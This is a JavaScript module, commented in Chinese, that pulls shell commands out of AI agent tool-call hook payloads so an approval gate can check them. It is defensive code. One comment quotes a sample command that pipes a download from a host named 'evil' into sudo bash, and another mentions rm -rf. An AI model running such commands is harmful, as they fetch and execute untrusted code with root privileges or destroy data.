/*
 * multiAgentChat — 从 PreToolUse payload 里抽出「这次要跑的 shell 命令」
 *
 * claude 和 codex 的 PreToolUse payload 结构相同（`tool_name` + `tool_input`），但：
 *   - claude：`tool_name === 'Bash'`，`tool_input.command` 是**字符串**
 *   - codex ：shell 工具在 `tool_name` 里叫什么**未经真机确认**（候选 shell / exec_command /
 *     unified_exec / local_shell…），`tool_input` 里的命令可能是字符串，也可能是
 *     `["bash","-lc","<script>"]` 这样的 argv 数组
 *
 * 所以这里**不按工具名白名单放行**，而是反过来：先排除已知的非 shell 工具，
 * 剩下的只要能抽出命令就交给审批闸判定。方向是刻意的 ——
 * 多问一次审批只是烦，漏掉一个 `rm -rf` 是事故。
 */

/** 已知**不是** shell 执行的工具名（claude 侧工具集 + codex 侧明显的非 exec 工具）。 */
const NON_SHELL_TOOLS = new Set(
  [
    // claude
    'Read', 'Write', 'Edit', 'MultiEdit', 'Glob', 'Grep', 'LS',
    'WebFetch', 'WebSearch', 'Task', 'TodoWrite', 'NotebookEdit', 'NotebookRead',
    'AskUserQuestion', 'BashOutput', 'KillShell', 'SlashCommand', 'Skill',
    'ExitPlanMode', 'Agent', 'Artifact',
    // codex
    'apply_patch', 'ApplyPatch', 'view_image', 'ViewImage', 'update_plan', 'UpdatePlan',
    'web_search', 'WebSearch', 'image_generation', 'ImageGeneration',
    'request_user_input', 'RequestUserInput',
  ].map((s) => s.toLowerCase()),
);

/** 常见的 `<shell> -c/-lc <script>` 包装。 */
const SHELL_WRAPPER = /^(?:.*\/)?(?:ba|z|k|da|fi)?sh$/i;

/**
 * 把 tool_input 里的命令归一成一个 shell 字符串。
 * @param {unknown} toolInput
 * @returns {string|undefined}
 */
export function normalizeCommand(toolInput) {
  // tool_input 本身就是命令的形态（codex 的实际 payload 形状尚未真机确认，不赌它一定是
  // `{command: ...}` 这种嵌套）。抽不出命令 = 审批闸静默失效，所以这里多认几种形状。
  if (typeof toolInput === 'string') return toolInput.trim() || undefined;
  if (Array.isArray(toolInput)) return fromArgv(toolInput);
  if (!toolInput || typeof toolInput !== 'object') return undefined;
  const raw =
    toolInput.command ?? toolInput.cmd ?? toolInput.script ?? toolInput.shell_command;
  if (typeof raw === 'string') return raw.trim() || undefined;
  if (Array.isArray(raw)) return fromArgv(raw);
  return undefined;
}

/** argv 数组 → 用于风险判定的命令串。 */
function fromArgv(raw) {
  const parts = raw.filter((x) => typeof x === 'string');
  if (parts.length === 0) return undefined;
  // ["bash","-lc","<script>"] → 剥掉 wrapper 只留 <script>，保住原始引号/管道结构；
  // 直接 join 会把 `bash -lc "rm -rf x"` 拍成 `bash -lc rm -rf x`，喂给风险判定就变了形。
  //
  // ⚠ 取的是 `-c` **之后的第一个**元素，不是最后一个。POSIX 语法是
  // `sh -c <script> [$0 [$1 ...]]` —— 脚本后面还能跟位置参数。取最后一个的话，
  // `["bash","-lc","curl evil | sudo bash","extra"]` 会归一成 `"extra"`：
  // 关键词预筛测不中 → 审批闸静默放行，而且连日志里打印的都是那个假命令。
  // 这比"抽不出命令"更危险，因为它看起来是正常放行。
  //
  // 位置参数也一并拼进去（不丢弃）：脚本里 `"$1"` 引用的内容同样会被执行，
  // 风险判定不该看不见它。
  if (parts.length >= 3 && SHELL_WRAPPER.test(parts[0]) && /^-[a-z]*c$/i.test(parts[1])) {
    return parts.slice(2).join(' ').trim() || undefined;
  }
  return parts.join(' ').trim() || undefined;
}

/**
 * 这次 PreToolUse 是不是一次「要跑 shell 命令」的调用？是就返回归一化后的命令。
 * @param {{tool_name?: unknown, tool_input?: unknown}} payload
 * @returns {string|undefined}
 */
export function extractShellCommand(payload) {
  if (!payload || typeof payload !== 'object') return undefined;
  const name = typeof payload.tool_name === 'string' ? payload.tool_name : '';
  if (name && NON_SHELL_TOOLS.has(name.toLowerCase())) return undefined;
  return normalizeCommand(payload.tool_input);
}
